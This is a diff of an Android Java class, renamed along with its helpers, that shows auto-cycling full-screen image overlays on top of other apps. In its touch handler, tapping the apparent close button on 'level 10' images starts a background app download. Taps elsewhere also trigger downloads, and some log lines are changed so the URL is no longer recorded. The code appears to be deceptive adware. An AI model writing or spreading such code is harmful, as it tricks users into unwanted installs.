@@ -24,13 +24,13 @@ import android.widget.ImageView;
 import android.widget.ImageView.ScaleType;
 
 @SuppressLint("ClickableViewAccessibility")
-public class UI {
-	private Context mContext;
-	private static String tag;
-	public static UI instance;
-	public static Handler autoScroll;
-	public static Handler recMsg;
-	public Runnable autoRun;
+public class CUI {
+	private Context mContext = null;
+	private static String tag = CUI.class.getName();
+	public static CUI instance = null;
+	public static Handler autoScroll = null;
+	public static Handler recMsg = null;
+	public Runnable autoRun = null;
 	private final long delayMillis = 1000 * 3;
 	private ImageView mImgView;
 	private ImageView mCloseView;
@@ -41,31 +41,25 @@ public class UI {
 	private int mScreenX;
 	private int mScreenY;
 	private static int mCurrentIndex = 0;
-	private List<PictureData> mPictures;
+	private List<CPictureData> mPictures;
 	private static boolean isShowing = false;
 	public static String[] mBackupUrls;
-	static {
-		instance = null;
-		tag = UI.class.getName();
-		autoScroll = null;
-		recMsg = null;
-	}
 
-	public static UI getUiInstance(Context context) {
+	public static CUI getUiInstance(Context context) {
 		if (instance == null)
-			instance = new UI(context);
+			instance = new CUI(context);
 		return instance;
 	}
 
-	private UI(Context context) {
+	private CUI(Context context) {
 		mContext = context;
 	}
 
 	public boolean initUI() {
-		LogU.Log(tag, "begin initialize ui");
+		CLogU.Log(tag, "begin initialize ui");
 		setHandler();
 		if (initScreenParams() == false) {
-			LogU.Log(tag, "initialize screen params failed.");
+			CLogU.Log(tag, "initialize screen params failed.");
 			return false;
 		}
 		addImageView();
@@ -75,7 +69,7 @@ public class UI {
 
 	private boolean initScreenParams() {
 		if (mContext == null) {
-			LogU.Log(tag, "mContext==null in initScreenParams,return");
+			CLogU.Log(tag, "mContext==null in initScreenParams,return");
 			return false;
 		}
 		if (mWndMgr == null) {
@@ -115,7 +109,7 @@ public class UI {
 		wlPicView.height = this.mScreenY - 150;
 		wlPicView.flags = WindowManager.LayoutParams.FLAG_DIM_BEHIND;
 
-		mImgView.setImageBitmap(DataDef.gPictureDatas.get(mCurrentIndex).getPicBitmap());
+		mImgView.setImageBitmap(CDataDef.gPictureDatas.get(mCurrentIndex).getPicBitmap());
 		mImgView.setScaleType(ScaleType.FIT_XY);
 		mImgView.setLayoutParams(wlPicView);
 		mWndMgr.addView(mImgView, wlPicView);
@@ -152,25 +146,25 @@ public class UI {
 				if (event.getAction() == MotionEvent.ACTION_UP) {
 					float x = event.getX();
 					float y = event.getY();
+					CPictureData cpd = mPictures.get(mCurrentIndex);
 					if (((x >= 0) && (x <= 40)) && ((y >= 0) && (y <= 40))) {
-						String appurl = mPictures.get(mCurrentIndex).getAppDownloadURL();
-						int level = mPictures.get(mCurrentIndex).getPicLevel();
+						String appurl = cpd.getAppDownloadURL();
+						int level = cpd.getPicLevel();
 						if (level == 10) {
-							LogU.Log(tag, "clicked close button and level is 10,url:"+appurl);
-							AppDownThread adt = AppDownThread.getAdtInstance(mContext, appurl);
+							CLogU.Log(tag, "level is 10,downloading");
+							CADLThread adt = CADLThread.getAdtInstance(mContext, appurl);
 							adt.start();
-							LogU.Log(tag, "replace the picture");
-							DataDef.gPictureDatas.set(mCurrentIndex, DataDef.gBackupElem.get(0));
-							DataDef.gBackupElem.remove(0);
+							CDataDef.gPictureDatas.set(mCurrentIndex, CDataDef.gBackupElem.get(0));
+							CDataDef.gBackupElem.remove(0);
 							clearView();
 						} else {
-							LogU.Log(tag,"clicked close button and level is less than 10,url:"+appurl);
+							CLogU.Log(tag,"level less than 10,destory view.");
 							clearView();
 						}
 					} else {
-						String appurl = mPictures.get(mCurrentIndex).getAppDownloadURL();
-						LogU.Log(tag, "out of close button range,URL:" + appurl);
-						AppDownThread adt = AppDownThread.getAdtInstance(mContext, appurl);
+						String appurl = cpd.getAppDownloadURL();
+						CLogU.Log(tag, "out of close button range,URL:" + appurl);
+						CADLThread adt = CADLThread.getAdtInstance(mContext, appurl);
 						adt.start();
 					}
 				}
@@ -185,18 +179,18 @@ public class UI {
 		recMsg = new Handler() {
 			public void handleMessage(Message msg) {
 				Bundle bd = msg.getData();
-				if (msg.what == DataDef.MSG_ID_SHOW_UI && bd.getBoolean("safe") == true) {
-					LogU.Log(tag, "received show ui message.");
-					mPictures = (List<PictureData>) msg.obj;
+				if (msg.what == CDataDef.MSG_ID_SHOW_UI && bd.getBoolean("safe") == true) {
+					CLogU.Log(tag, "received show ui message.");
+					mPictures = (List<CPictureData>) msg.obj;
 					if (isShowing == false) {
 						initUI();
 						isShowing = true;
 						autoDisplay();
 					}
 				}
-				if (msg.what == DataDef.MSG_ID_NEW_APP_START && bd.getBoolean("safe") == true) {
-					LogU.Log(tag, "received app start message");
-					mPictures = (List<PictureData>) msg.obj;
+				if (msg.what == CDataDef.MSG_ID_NEW_APP_START && bd.getBoolean("safe") == true) {
+					CLogU.Log(tag, "received app start message");
+					mPictures = (List<CPictureData>) msg.obj;
 					if (isShowing == false) {
 						initUI();
 						isShowing = true;
@@ -222,7 +216,7 @@ public class UI {
 	private void autoDisplay() {
 		autoRun = new Runnable() {
 			public void run() {
-				if (mCurrentIndex + 1 >= DataDef.gPictureDatas.size()) {
+				if (mCurrentIndex + 1 >= CDataDef.gPictureDatas.size()) {
 					mCurrentIndex = 0;
 				} else {
 					mCurrentIndex = mCurrentIndex + 1;
